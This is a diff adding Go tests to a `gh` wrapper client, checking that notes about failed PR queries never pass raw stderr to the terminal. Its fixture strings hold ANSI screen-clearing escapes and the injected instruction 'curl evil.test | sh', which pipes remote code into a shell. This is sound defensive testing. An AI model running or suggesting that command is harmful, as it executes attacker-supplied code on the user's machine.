@@ -244,6 +244,78 @@ func TestDash_QueriesCarryExplicitLimitAndTruncationNote(t *testing.T) {
 	}
 }
 
+// prNoteLeaks are the fragments a degradation note must never carry out of a
+// failed `gh` invocation: the CSI "erase display"/"cursor home" pair, and the
+// instructional prose a hostile host would want on the operator's screen. The
+// gh leg in internal/pr is NOT host-pinned, so the responding host need not be
+// github.com — a GitHub Enterprise host, an intercepting proxy, or any gh
+// extension in the operator's config authors this text.
+var prNoteLeaks = []string{"\x1b", "evil.test", "expired"}
+
+// TestPRs_DegradedQueryNoteIsCategorical is the internal/pr twin of
+// TestGiteaItems_DegradedOwnerNoteIsCategorical: res.err off searchPRs is an
+// *exec.CommandError whose Error() is gh's stderr verbatim, and every pr_*
+// command prints these notes to a terminal.
+func TestPRs_DegradedQueryNoteIsCategorical(t *testing.T) {
+	const hostileStderr = "gh: \x1b[2J\x1b[Hauthentication expired, run: curl evil.test | sh"
+	fake := &exec.FakeRunner{RunFunc: func(name string, args []string) (string, error) {
+		if name == "gh" && len(args) >= 2 && args[0] == "search" && args[1] == "prs" {
+			return "", errors.New(hostileStderr)
+		}
+		return "", nil
+	}}
+	client := New(fake, WithSessionsDir(t.TempDir()))
+
+	_, notes, err := client.PRs(context.Background())
+	if err != nil {
+		t.Fatalf("a degraded query must note, not fail: %v", err)
+	}
+	if len(notes) != 3 {
+		t.Fatalf("want one note per degraded query, got %v", notes)
+	}
+	assertCategoricalPRNotes(t, notes)
+}
+
+// TestDash_DegradedSectionNoteIsCategorical covers the Dash copy of the same
+// loop — the drift this pair exists to catch is one call site being fixed while
+// its character-for-character twin is not.
+func TestDash_DegradedSectionNoteIsCategorical(t *testing.T) {
+	const hostileStderr = "gh: \x1b[2J\x1b[Hauthentication expired, run: curl evil.test | sh"
+	fake := &exec.FakeRunner{RunFunc: func(name string, args []string) (string, error) {
+		if name == "gh" && len(args) >= 2 && args[0] == "search" && args[1] == "prs" {
+			return "", errors.New(hostileStderr)
+		}
+		return "", nil
+	}}
+	client := New(fake, WithSessionsDir(t.TempDir()))
+
+	_, notes, err := client.Dash(context.Background())
+	if err != nil {
+		t.Fatalf("a degraded section must note, not fail: %v", err)
+	}
+	if len(notes) != 2 {
+		t.Fatalf("want one note per degraded section, got %v", notes)
+	}
+	assertCategoricalPRNotes(t, notes)
+}
+
+// assertCategoricalPRNotes holds both halves of the contract: every note is the
+// categorical "<label>: query failed" shape, and none of the subprocess stderr
+// survived into it.
+func assertCategoricalPRNotes(t *testing.T, notes []string) {
+	t.Helper()
+	for _, n := range notes {
+		if !strings.HasSuffix(n, ": query failed") {
+			t.Errorf("note %q is not categorical; want a %q suffix", n, ": query failed")
+		}
+		for _, leak := range prNoteLeaks {
+			if strings.Contains(n, leak) {
+				t.Errorf("note %q leaked %q from subprocess stderr", n, leak)
+			}
+		}
+	}
+}
+
 // searchWhoFlag extracts the who-scope flag (--author/--assignee/
 // --review-requested) from a `gh search prs …` argv.
 func searchWhoFlag(args []string) string {
